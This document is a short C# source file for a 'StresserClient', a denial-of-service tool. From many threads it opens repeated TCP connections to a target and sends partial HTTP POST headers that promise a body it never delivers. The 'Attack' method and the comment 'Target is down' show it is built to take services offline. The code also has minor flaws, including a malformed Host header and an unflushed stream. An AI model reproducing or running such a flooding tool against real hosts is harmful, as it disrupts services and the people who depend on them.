using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;


namespace StresserClient
{
    public class Client
    {
        private byte[] packet = System.Text.ASCIIEncoding.ASCII.GetBytes("This is a test.");

        public readonly string ip = "localhost";
        public readonly int port = 0;

        private bool run = true;

        public Client(string ip, int port)
        {
            this.ip = ip;
            this.port = port;
        }

        public Client()
        {

        }

        public void Send()
        {
            TcpClient client = new TcpClient();
            client.NoDelay = true;
            client.Connect(ip, port);
            StreamWriter stream = new StreamWriter(client.GetStream());
            stream.Write("POST / HTTP/1.1\r\nHost " + ip + "\r\nContent-length: 5000\r\n\r\n");
        }

        public void Stop()
        {
            run = false;
        }

        public void Attack(int threads)
        {
            for (int i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    //Thread.CurrentThread.Name = $"Thread{i}";

                    while (run)
                    {
                        try
                        {
                            this.Send();
                        }
                        catch
                        {
                            // Target is down
                            Console.WriteLine("Thread {0} unable to attack", Thread.CurrentThread);
                        }
                    }
                    Console.WriteLine("Thread {0} stopped attacking", Thread.CurrentThread);

                    return;

                    Console.WriteLine("Post return");
                }).Start();
            }
        }
    }
}
